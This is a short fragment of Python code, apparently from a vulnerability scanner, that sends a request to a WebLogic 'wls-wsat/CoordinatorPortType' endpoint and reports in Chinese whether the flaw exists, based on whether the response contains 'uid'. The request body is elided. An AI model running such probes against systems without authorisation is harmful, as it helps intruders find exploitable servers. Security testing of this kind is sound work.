...
def a(url1,s_cookie):
    ...
    try:
        ...
        aa = requests.post(url1+'wls-wsat/CoordinatorPortType',data=body,headers=headers,cookies=s_cookie,proxies=proxies,verify=False, timeout=5)
        aa.encoding='utf-8'
        if aa.status_code==200 and 'uid' in aa.text:
            uj='[+]漏洞存在\n'+aa.text[0:100]
        else:
            uj='[-]漏洞不存在\n'
